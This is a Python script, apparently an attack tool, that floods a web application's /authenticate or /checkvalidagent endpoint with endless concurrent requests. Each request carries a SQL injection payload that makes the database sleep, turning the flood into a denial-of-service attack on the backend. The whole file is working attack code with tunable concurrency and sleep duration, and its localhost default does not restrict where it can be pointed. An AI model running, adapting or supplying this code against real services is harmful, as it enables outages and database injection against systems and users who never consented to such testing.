#!/usr/bin/env python3
"""Simplified infinite auth flooder.

Continuously (until Ctrl+C) fires POST requests to /authenticate with an injected
sleep payload (function('sleep',<n>)=0). Requests are fire-and-forget: the socket
is closed right after sending without waiting for a response.

Usage (runs until killed):
    python auth_flood.py --concurrency 300 --sleep 10 --progress

Key args:
    --concurrency   Max simultaneous open connections
    --sleep         Seconds for the DB sleep call
    --interval      Delay between scheduling new requests (throttle)
    --linger        Optional delay after write before closing (default 0)
    --progress      Print per‑second counters (sent/errors)

Stop with Ctrl+C (SIGINT).
"""
import asyncio, argparse, json, time, signal, sys, ssl
from urllib.parse import urlparse, quote

PAYLOAD_TEMPLATE = {
    "header": {},
    "payload": {
        # Injected userName with sleep; sleepSeconds substituted at runtime
        "userName": "0' or (function('sleep',{sleepSeconds})=0) or '1'='2",
        "password": "y",
    },
}

AGENT_INJECTION_TEMPLATE = "0' or (function('sleep',{sleepSeconds})=0) or '1'='2"

stop_requested = False
sent = 0
errors = 0


def handle_sig(*_):
    global stop_requested
    stop_requested = True


async def send_one(parsed, body_bytes, connect_timeout, write_timeout, linger, *, target, prebuilt_agent_path=None):
    global sent, errors
    scheme = parsed.scheme
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if scheme == "https" else 80)
    ssl_ctx = None
    if scheme == "https":
        ssl_ctx = ssl.create_default_context()
        # For self-signed dev envs you might disable verification:
        # ssl_ctx.check_hostname = False
        # ssl_ctx.verify_mode = ssl.CERT_NONE
    try:
        fut = asyncio.open_connection(host, port, ssl=ssl_ctx)
        reader, writer = await asyncio.wait_for(fut, timeout=connect_timeout)
        if target == "authenticate":
            headers = [
                f"POST {parsed.path or '/authenticate'} HTTP/1.1",
                f"Host: {host}",
                "User-Agent: auth-flood/1",
                "Accept: application/json",
                "Content-Type: application/json",
                f"Content-Length: {len(body_bytes)}",
                "Connection: close",
                "", "",
            ]
            req = "\r\n".join(headers).encode() + body_bytes
        else:  # agent
            path = prebuilt_agent_path or (parsed.path or '/checkvalidagent')
            headers = [
                f"GET {path} HTTP/1.1",
                f"Host: {host}",
                "User-Agent: auth-flood/1",
                "Accept: */*",
                "Connection: close",
                "", "",
            ]
            req = "\r\n".join(headers).encode()
        await asyncio.wait_for(writer.drain(), timeout=write_timeout)  # ensure buffer space
        writer.write(req)
        try:
            await asyncio.wait_for(writer.drain(), timeout=write_timeout)
        except Exception:
            pass
        if linger:
            await asyncio.sleep(linger)
        writer.close()
        # Do not await writer.wait_closed(); we want fire-and-forget
        sent += 1
    except Exception:
        errors += 1


async def run(args):
    global stop_requested
    parsed = urlparse(args.url)
    if not parsed.scheme:
        parsed = urlparse("http://" + args.url)
    path = parsed.path or "/authenticate"
    if path == "/":
        # default path
        parsed = parsed._replace(path="/authenticate")

    body_bytes = b""
    prebuilt_agent_path = None
    if args.target == "authenticate":
        body_obj = PAYLOAD_TEMPLATE.copy()
        body_payload = body_obj["payload"].copy()
        body_payload["userName"] = body_payload["userName"].format(sleepSeconds=args.sleep)
        body_obj["payload"] = body_payload
        body_bytes = json.dumps(body_obj, separators=(",", ":")).encode()
    else:
        inj = AGENT_INJECTION_TEMPLATE.format(sleepSeconds=args.sleep)
        inj_enc = quote(inj, safe="")
        path = parsed.path or "/checkvalidagent"
        if path == "/":
            path = "/checkvalidagent"
        prebuilt_agent_path = f"{path}?agentCode={inj_enc}"

    semaphore = asyncio.Semaphore(args.concurrency)

    async def producer():
        while not stop_requested:
            await semaphore.acquire()
            asyncio.create_task(worker())
            if args.interval > 0:
                await asyncio.sleep(args.interval)

    async def worker():
        try:
            await send_one(parsed, body_bytes, args.connect_timeout, args.write_timeout, args.linger, target=args.target, prebuilt_agent_path=prebuilt_agent_path)
        finally:
            semaphore.release()

    prod_task = asyncio.create_task(producer())

    # Progress printer
    last = 0
    try:
        while True:
            await asyncio.sleep(1)
            if args.progress and sent != last:
                print(f"sent={sent} errors={errors}")
                last = sent
            if stop_requested:
                break
    finally:
        # brief grace period for currently writing tasks
        await asyncio.sleep(0.5)
        if args.progress:
            print(f"final: sent={sent} errors={errors}")


def parse_args():
    ap = argparse.ArgumentParser(description="Infinite asynchronous fire-and-forget flood of /authenticate with sleep injection (Ctrl+C to stop)")
    ap.add_argument("--url", default=None, help="Base URL (defaults per target) e.g. http://127.0.0.1:8443")
    ap.add_argument("--target", choices=["authenticate", "agent"], default="authenticate", help="Endpoint target: authenticate (POST) or agent (GET /checkvalidagent)")
    ap.add_argument("--concurrency", type=int, default=200, help="Max simultaneous open connections")
    ap.add_argument("--interval", type=float, default=0.0, help="Delay between scheduling requests (seconds)")
    ap.add_argument("--sleep", type=int, default=10, help="DB sleep seconds inside injected payload")
    ap.add_argument("--connect-timeout", type=float, default=3.0, help="TCP connect timeout")
    ap.add_argument("--write-timeout", type=float, default=3.0, help="Write/drain timeout")
    ap.add_argument("--linger", type=float, default=0.0, help="Optional delay after sending before closing")
    ap.add_argument("--progress", action="store_true", help="Print per-second progress")
    args = ap.parse_args()
    if not args.url:
        # derive default URL per target
        base = "http://127.0.0.1:8443"
        if args.target == "authenticate":
            args.url = base + "/authenticate"
        else:
            args.url = base + "/checkvalidagent"
    return args


def main():
    args = parse_args()
    signal.signal(signal.SIGINT, handle_sig)
    if hasattr(signal, "SIGTERM"):
        signal.signal(signal.SIGTERM, handle_sig)
    try:
        asyncio.run(run(args))
    except KeyboardInterrupt:
        pass
    print(f"Done. sent={sent} errors={errors}")


if __name__ == "__main__":
    main()
